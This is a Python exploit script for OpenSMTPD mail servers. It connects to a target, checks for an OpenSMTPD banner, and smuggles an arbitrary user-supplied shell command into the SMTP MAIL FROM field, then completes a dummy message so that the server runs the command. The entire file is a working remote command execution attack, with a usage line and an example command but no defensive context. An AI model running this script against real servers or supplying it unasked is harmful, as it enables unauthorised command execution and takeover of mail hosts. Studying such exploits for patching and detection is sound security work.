from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')